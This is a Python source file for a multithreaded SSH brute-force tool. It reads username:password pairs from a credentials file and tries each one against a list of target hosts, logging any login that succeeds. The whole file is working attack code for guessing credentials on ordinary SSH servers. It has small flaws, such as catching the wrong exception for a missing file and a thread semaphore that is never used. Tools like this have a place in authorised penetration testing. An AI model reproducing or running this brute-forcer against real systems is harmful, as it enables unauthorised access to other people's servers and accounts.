from pexpect import pxssh
import time
from threading import *
import logging

# Console colors
W = '\033[0m'  # white (normal)
R = '\033[31m' # red
G = '\033[32m' # green

# global variables for threads coordination
Found = False
Fails = 0

class ContinueBrute(Exception):
    pass


class SSH_BruteForcer(object):

    def __init__(self, target_list, target_port, credfile, thread):
        self.connection_lock = BoundedSemaphore(value=thread)
        self.target_list = target_list
        self.target_port = target_port
        self.findings = []

        try:
            self.credfile = open(credfile,'r')
        except FileExistsError:
            logging.warning(R+'Credentials file does not exist, exiting...'+W)
            exit(1)


    def connect(self, host, user, password, port, release):
        """
        handle the ssh connection and try the credentials
        :param host: string
        :param user: string
        :param password: string
        :param port: string
        :param release: boolean
        :return:
        """
        global Found, Fails
        try:
            ssh = pxssh.pxssh(echo=False)
            ssh.login(server=host, port=port, username=user, password=password)
            time.sleep(1)
            logging.info(G + 'SSH Password Found for host: %s:%s \nUsername: %s \nPassword: %s' % (host, port, user, password) +W)
            if password == '':
                password = '(blank)'
            finding = 'SSH Credentials for ' + host + ':' + port + ' found! ' + 'Credentials: ' + user + ':' + password
            self.findings.append(finding)
            Found = True
        except Exception as e:
            if 'read_nonblocking' in str(e):
                Fails += 1
                time.sleep(5)
                self.connect(host, user, password, port, False)
            elif 'synchronize with original prompt' in str(e):
                Fails += 1
                time.sleep(1)
                self.connect(host, user, password, port, False)

        finally:
            if release:
                pass


    def run(self):
        """
        Launch the attack
        :return: findings
        """
        global Found, Fails
        for host in self.target_list:
            logging.debug('Host: '+host)
            Fails = 0
            target = host
            port = self.target_port
            self.credfile.seek(0)
            logging.info('Testing: %s:%s' % (target, port))
            try:
                for line in self.credfile.readlines():
                    logging.debug('line: '+str(line))
                    user = line.split(':')[0].strip('\r').strip('\n')
                    password = line.split(':')[1].strip('\r').strip('\n')
                    if password == '(none)':
                        password = ''
                    if Found:
                        raise ContinueBrute

                    if Fails > 5:
                        logging.warning(R + 'Too many errors for host: %s:%s' % (target, port)+W)
                        raise ContinueBrute
                    logging.debug('Testing host: %s:%s \nUsername: %s \nPassword: %s' % (target, port, user, password))
                    self.connect(target, user, password, port, True)

            except ContinueBrute:
                Found = False
                continue

        if not self.findings:
            self.findings.append('SSH Credentials for ' + host + ':' + port + ' not found!')
        return self.findings
